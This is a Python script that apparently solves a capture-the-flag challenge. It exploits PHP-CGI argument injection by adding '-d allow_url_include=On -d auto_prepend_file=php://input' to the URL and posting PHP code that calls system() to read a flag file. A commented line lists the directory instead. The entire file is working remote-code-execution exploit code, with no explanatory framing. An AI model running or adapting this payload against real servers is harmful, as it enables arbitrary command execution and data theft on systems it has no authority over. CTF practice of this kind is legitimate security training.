import requests


def post(url: str, data):
    resp = requests.post(url, data)

    if resp.raise_for_status():
        raise ValueError("hoge")

    return resp


def main():
    url = "https://ctfq.u1tramarine.blue/q12/index.php"
    code = "?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input"
    # data = "<?php system('ls -al') ?>"
    data = "<?php system('cat flag_flag_flag.txt') ?>"
    resp = post(url + code, data)

    print(resp.text)


if __name__ == "__main__":
    main()
